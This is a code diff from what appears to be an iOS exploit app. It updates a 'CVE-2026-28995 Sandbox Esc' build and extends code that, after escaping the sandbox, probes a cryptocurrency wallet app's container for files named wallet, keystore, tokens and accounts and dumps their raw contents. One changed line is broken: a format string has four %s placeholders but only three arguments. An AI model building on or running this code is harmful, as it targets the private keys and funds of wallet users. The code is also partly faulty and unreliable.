@@ -719,7 +719,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v30" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v31" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7493,7 +7493,7 @@ static void *iohid_threadCopyEvent(void *arg) {
     for (int si = 0; subdirs[si]; si++) {
         for (int ni = 0; baseNames[ni]; ni++) {
             for (int ei = 0; extensions[ei]; ei++) {
-                NSString *rel = [NSString stringWithFormat:@"%s/%s%s",
+                NSString *rel = [NSString stringWithFormat:@"%s/%s%s%s",
                     [tpBase UTF8String], subdirs[si], baseNames[ni], extensions[ei]];
                 NSString *fpFull = TRYFILE(rel);
                 BOOL ex = [fm fileExistsAtPath:fpFull];
@@ -7514,6 +7514,7 @@ static void *iohid_threadCopyEvent(void *arg) {
 
     // Part C: Also probe .plist and .json files for path references
     [log appendString:@"\n[Part C] Probe config/plist/json files:\n"];
+    hits = 0;
     const char *configNames[] = {
         ".plist","Info.plist","config.plist","settings.plist","manifest.plist",
         "config.json","settings.json","app.json","manifest.json","package.json",
@@ -7543,10 +7544,10 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
     [log appendFormat:@"  Config hits: %d\n", hits];
 
-    // Part D: Probe raw SQLite header magic to identify databases
-    [log appendString:@"\n[Part D] SQLite magic probe on cache dir files:\n"];
+    // Part D: Probe raw SQLite header magic on extensionless files
+    [log appendString:@"\n[Part D] SQLite magic probe on extensionless files:\n"];
+    hits = 0;
     const char *sqliteMagic = "SQLite format 3";
-    // Try common single-word filenames without extension in the bundle-id dir
     const char *quickNames2[] = {
         "wallet","Wallet","WALLET","tpwallet","TPWallet","TP_Wallet",
         "global","Global","GLOBAL","global_wallet","GlobalWallet",
@@ -7555,6 +7556,7 @@ static void *iohid_threadCopyEvent(void *arg) {
         "data","Data","DATA","db","DB",
         "keystore","KeyStore","key_store",
         "accounts","Accounts","tokens","Tokens",
+        "cache","Cache","CACHE",
         NULL
     };
     for (int ni = 0; quickNames2[ni]; ni++) {
@@ -7565,7 +7567,6 @@ static void *iohid_threadCopyEvent(void *arg) {
         if (ex) {
             NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
             unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
-            // Read first 16 bytes to check SQLite magic
             int fd = open([fpFull UTF8String], O_RDONLY);
             char hdr[16] = {0};
             if (fd >= 0) { read(fd, hdr, 16); close(fd); }
@@ -7577,6 +7578,84 @@ static void *iohid_threadCopyEvent(void *arg) {
             hits++;
         }
     }
+    [log appendFormat:@"  Extensionless hits: %d\n", hits];
+
+    // Part E: Read Documents/cache content (found in v30, 1248 bytes)
+    [log appendString:@"\n[Part E] Read Documents/cache file content:\n"];
+    NSString *cacheRel = [NSString stringWithFormat:@"%s/Documents/cache",
+        [tpBase UTF8String]];
+    NSString *cachePath = TRYFILE(cacheRel);
+    BOOL cacheExists = [fm fileExistsAtPath:cachePath];
+    [log appendFormat:@"  Documents/cache exists: %@\n", cacheExists ? @"YES" : @"NO"];
+    if (cacheExists) {
+        NSDictionary *attrs = [fm attributesOfItemAtPath:cachePath error:nil];
+        [log appendFormat:@"  size: %llu bytes\n", [attrs[NSFileSize] unsignedLongLongValue]];
+        // Read raw bytes
+        int fd = open([cachePath UTF8String], O_RDONLY);
+        if (fd >= 0) {
+            unsigned char buf[128];
+            ssize_t n = read(fd, buf, sizeof(buf));
+            if (n > 0) {
+                NSMutableString *hex = [NSMutableString string];
+                for (int i = 0; i < MIN(64, n); i++)
+                    [hex appendFormat:@"%02x ", buf[i]];
+                [log appendFormat:@"  first %zd bytes hex: %@\n", n, hex];
+                // Check for known magic
+                BOOL isSQLite = (n >= 16 && memcmp(buf, sqliteMagic, 16) == 0);
+                BOOL isBplist = (n >= 6 && memcmp(buf, "bplist", 6) == 0);
+                BOOL isJSON = (buf[0] == '{' || buf[0] == '[');
+                BOOL isXML = (n >= 5 && memcmp(buf, "<?xml", 5) == 0);
+                [log appendFormat:@"  type: %s\n",
+                    isSQLite ? "SQLite3" : isBplist ? "binary plist" :
+                    isJSON ? "JSON" : isXML ? "XML" : "unknown"];
+                // Try as UTF-8 string
+                if (!isBplist && !isSQLite) {
+                    NSString *str = [[NSString alloc] initWithBytes:buf length:n encoding:NSUTF8StringEncoding];
+                    if (str) [log appendFormat:@"  as UTF-8: %@\n", [str substringToIndex:MIN(300, str.length)]];
+                }
+            }
+            close(fd);
+        }
+    }
+
+    // Part F: Probe v30-found extensionless files across ALL subdirs
+    [log appendString:@"\n[Part F] Probe extensionless files in all subdirs:\n"];
+    hits = 0;
+    const char *extraSubdirs[] = {
+        "Library/Caches/com.global.wallet.ios/",
+        "Library/Caches/",
+        "Documents/",
+        "Library/",
+        "Library/Application Support/",
+        "Library/Preferences/",
+        NULL
+    };
+    const char *simpleNames[] = {
+        "cache","data","db","wallet","main","default","storage",
+        "config","settings","tokens","accounts","keystore",
+        "tron","trx","eth","btc","sol","global",
+        "Cache","Data","DB","Wallet","Main","Default","Storage",
+        "Config","Settings","Tokens","Accounts","KeyStore",
+        "Tron","TRX","ETH","BTC","SOL","Global",
+        NULL
+    };
+    for (int si = 0; extraSubdirs[si]; si++) {
+        for (int ni = 0; simpleNames[ni]; ni++) {
+            NSString *rel = [NSString stringWithFormat:@"%s/%s%s",
+                [tpBase UTF8String], extraSubdirs[si], simpleNames[ni]];
+            NSString *fpFull = TRYFILE(rel);
+            BOOL ex = [fm fileExistsAtPath:fpFull];
+            if (ex) {
+                NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
+                unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
+                BOOL isDir = [attrs[NSFileType] isEqualToString:NSFileTypeDirectory];
+                [log appendFormat:@"  [+] %s%s (%llu bytes)%s\n",
+                    extraSubdirs[si], simpleNames[ni], sz, isDir ? @" [DIR]" : @""];
+                hits++;
+            }
+        }
+    }
+    [log appendFormat:@"  Extensionless hits: %d\n", hits];
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
